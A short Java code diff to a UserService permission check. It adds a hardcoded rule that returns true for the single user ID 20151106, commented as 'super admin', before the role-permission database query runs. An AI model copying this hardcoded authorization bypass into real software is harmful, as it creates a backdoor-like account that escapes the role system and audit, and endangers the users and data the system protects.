@@ -72,6 +72,10 @@ public class UserService {
             return false;
         }
 
+        if (userBean.getId().equals(20151106L)) {
+            //超管
+            return true;
+        }
         String sql = "select p.permission from role_permission rp " +
                 "left join permission p " +
                 "on rp.permission_id = p.id where role_id = :roleId";
